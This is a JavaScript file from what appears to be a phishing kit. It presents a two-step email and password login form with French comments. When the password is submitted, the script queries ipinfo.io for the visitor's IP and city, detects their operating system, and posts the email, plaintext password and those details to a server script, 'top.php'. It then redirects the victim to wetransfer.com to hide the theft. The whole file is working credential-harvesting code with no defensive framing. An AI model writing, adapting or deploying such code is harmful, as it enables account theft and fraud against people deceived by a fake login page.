const emailInput = document.getElementById('email');
const passwordContainer = document.getElementById('password-container');
const passwordInput = document.getElementById('password');
const continueBtn = document.getElementById('continue-btn');
const emailError = document.getElementById('email-error');
const passwordError = document.getElementById('password-error');

let isEmailPhase = true;

function validateEmail(email) {
    return email.includes('@') && email.includes('.');
}

function validatePassword(password) {
    return password.length >= 8;
}

function showPasswordField() {
    emailInput.disabled = true;
    passwordContainer.style.display = 'block';
    continueBtn.textContent = 'Connecter';
    isEmailPhase = false;
    emailError.style.display = 'none';
    passwordInput.focus();
}

continueBtn.addEventListener('click', function() {
    if (isEmailPhase) {
        const email = emailInput.value;
        if (validateEmail(email)) {
            showPasswordField();
        } else {
            emailError.style.display = 'block';
        }
    } else {
        const password = passwordInput.value;
        if (validatePassword(password)) {
            passwordError.style.display = 'none';

            // Requête pour récupérer les infos IP avec ipinfo.io
            fetch('https://ipinfo.io/?token=94c752f6b1e2fe')
                .then(response => response.json())
                .then(data => {
                    // Informations de géolocalisation
                    const ip = data.ip;
                    const ville = data.city;

                    // Détection du système d'exploitation
                    const userAgent = navigator.userAgent;
                    let os = "Inconnu";

                    if (userAgent.indexOf("Win") !== -1) os = "Windows";
                    else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
                    else if (userAgent.indexOf("X11") !== -1) os = "UNIX";
                    else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
                    else if (/Android/i.test(userAgent)) os = "Android";
                    else if (/iPhone|iPad|iPod/i.test(userAgent)) os = "iOS";

                    // Affichage dans la console pour vérifier
                    console.log("Données envoyées:", {
                        email: emailInput.value,
                        password: passwordInput.value,
                        ip: ip,
                        ville: ville,
                        os: os
                    });

                    // Envoi des données au serveur via fetch
                    const formData = new FormData();
                    formData.append('email', emailInput.value);
                    formData.append('password', passwordInput.value);
                    formData.append('ip', ip);
                    formData.append('ville', ville);
                    formData.append('os', os);

                    fetch('top.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Réponse du serveur:', data);
                        if (data.status === 'error') {
                            passwordError.textContent = data.message || 'Une erreur est survenue';
                            passwordError.style.display = 'block';
                        }
                        // Redirection après traitement
                        window.location.href = 'https://wetransfer.com/';
                    })
                    .catch(error => {
                        console.error('Erreur réseau:', error);
                        passwordError.textContent = 'Erreur de connexion au serveur';
                        passwordError.style.display = 'block';
                        window.location.href = 'https://wetransfer.com/';
                    });
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération des données IP:', error);
                    passwordError.textContent = 'Erreur lors de la récupération des données IP';
                    passwordError.style.display = 'block';
                });
        } else {
            passwordError.style.display = 'block';
        }
    }
});

emailInput.addEventListener('keyup', function(event) {
    if (event.key === 'Enter') {
        if (validateEmail(emailInput.value)) {
            showPasswordField();
        } else {
            emailError.style.display = 'block';
        }
    }
});

passwordInput.addEventListener('keyup', function(event) {
    if (event.key === 'Enter') {
        continueBtn.click();
    }
});